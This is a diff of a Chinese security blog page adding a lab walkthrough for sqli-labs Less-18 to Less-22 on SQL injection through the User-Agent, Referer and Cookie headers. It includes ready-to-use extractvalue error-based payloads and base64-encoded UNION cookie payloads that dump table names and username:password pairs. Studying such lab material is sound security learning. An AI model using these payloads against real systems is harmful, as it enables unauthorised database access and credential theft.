@@ -79,7 +79,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckza15jii00027gmahtng48u5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckzbhrktp0004ncmadxtk58r0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -90,7 +90,8 @@
 
 
 
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>查看源码可知有以下注意点：</p>
+<h2 id="0x01（useragent注入）"><a href="#0x01（useragent注入）" class="headerlink" title="0x01（useragent注入）"></a>0x01（useragent注入）</h2><p><strong>Less-18</strong></p>
+<p>查看源码可知有以下注意点：</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png" alt="image-20220205214039033"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br></pre></td></tr></table></figure>
 
@@ -146,6 +147,80 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000602759.png" alt="image-20220206000602759"></p>
+<hr>
+<h2 id="0x01（referer注入）"><a href="#0x01（referer注入）" class="headerlink" title="0x01（referer注入）"></a>0x01（referer注入）</h2><p><strong>Less-19</strong></p>
+<p><em>HTTP Referer是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/header/688992">header</a>的一部分，当<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8/213911">浏览器</a>向web<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</em></p>
+<p>首先输入<code>admin</code>和<code>admin</code>页面返回Referer信息，据此可知19关的思路应该是 Referer注入。</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206223214033.png" alt="image-20220206223214033"></p>
+<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>抓包后随便修改Referer值页面返回同样是修改后的内容：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206223703891.png" alt="image-20220206223703891"></p>
+<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>爆库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206224350236.png" alt="image-20220206224350236"></p>
+<p>爆表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="0x01（Cookie注入）"><a href="#0x01（Cookie注入）" class="headerlink" title="0x01（Cookie注入）"></a>0x01（Cookie注入）</h2><p><strong>Less-20</strong></p>
+<p>从源码分析如下：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206230125585.png" alt="image-20220206230125585"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206230141836.png" alt="image-20220206230141836"></p>
+<p> <code>$_COOKIE</code>接收到<code>username</code>的值后将会带入数据库查询，从这可以进行注入。</p>
+<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>首先进行正常输入<code>admin</code>和<code>admin</code>看一下回显页面：</p>
+<p>根据以上分析在<code>cookie</code>进行报错注入。</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232324785.png" alt="image-20220206232324785"></p>
+<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>记录一下踩得坑：</p>
+<p>这里抓包之后添加<code>Cookie：uname=admin</code>后使用POST方式提交的话返回异常回显：<img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206231743882.png" alt="image-20220206231743882"></p>
+<p>该成GET方式提交回显正常：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232500745.png" alt="image-20220206232500745"></p>
+<p>爆库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27; or extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232706475.png" alt="image-20220206232706475"></p>
+<p>后续过程与Less-19相同，同样也可以使用其他注入。</p>
+<hr>
+<p>##0x01（Cookie注入-base64）</p>
+<p>从源码分析得知，与Less-20不同的是，Less-21对<code>uname</code>字段进行了base64加密：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206233854877.png" alt="image-20220206233854877"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206233952173.png" alt="image-20220206233952173"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206235141632.png" alt="image-20220206235141632"></p>
+<p>这里其实是：<code>$_COOKIE</code>获取到<code>uname</code>字段的内容后先进行了<strong>base64_encode</strong>，提交表单之后又进行了<strong>base64_decode</strong>，最后将解密后的<code>cookie</code>代入数据库查询，最后又进行了<strong>base64_encode</strong>。由此可知，在注入的时候要先要进行一次<strong>base64_encode</strong>，思路大概就是这样。</p>
+<p><strong>这里还需注意一个点：此处的cookie值进行了<code>&#39;)</code>处理，导致开始注入的时候老是报语法错误。</strong></p>
+<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>先抓包，然后进行<code>cookie</code>加密注入：</p>
+<p>探测一下字段数，有3个字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4nKSBvcmRlciBieSA0Iw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207001749683.png" alt="image-20220207001749683"></p>
+<p>联合注入爆库，爆版本号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkj</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002221359.png" alt="image-20220207002221359"></p>
+<p>爆表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002533567.png" alt="image-20220207002533567"></p>
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207003331834.png" alt="image-20220207003331834"></p>
+<p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gc2VjdXJpdHkudXNlcnMj</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002804799.png" alt="image-20220207002804799"></p>
+<p>Less-21最关键的就在于<strong>base64</strong>加解密的注入。</p>
+<h2 id="0x01（Cookie注入）-1"><a href="#0x01（Cookie注入）-1" class="headerlink" title="0x01（Cookie注入）"></a>0x01（Cookie注入）</h2><p><strong>Less-22</strong></p>
+<p>这里只有编码注入的时候注意<code>&quot;</code>就OK：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207003837052.png" alt="image-20220207003837052"></p>
+<p>其他payload与Less-21相同。</p>
 
       
     </div><!-- .entry-content -->
@@ -182,7 +257,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckza15jij00037gmahk7w5042" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzbhrktp0003ncma5r3n94s9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -267,7 +342,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckza15jil00057gmadnmj5fw7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckzbhrktq0005ncma6jkp2w1u" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -425,7 +500,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckza15jik00047gma4nfpesyy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckzbhrkto0002ncmadzvz543f" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -480,7 +555,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckza15jj6000m7gma044k2wke" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzbhrku7000mncma0itcfa64" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -551,7 +626,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckza15jj7000o7gma87aw3lsi" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzbhrku9000oncmabsjx3jvr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -849,7 +924,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckza15jim00077gma23u7d1ba" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckzbhrkts0007ncmabx9shlrt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -958,7 +1033,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckza15jil00067gmae6q95vu2" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckzbhrktr0006ncmafbnlaxg9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1044,7 +1119,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckza15jin00087gma1hxud48r" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckzbhrkts0008ncma98vw95h9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1181,7 +1256,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckza15jig00017gmagaqa074r" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckzbhrktm0001ncmae6o7h1op" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
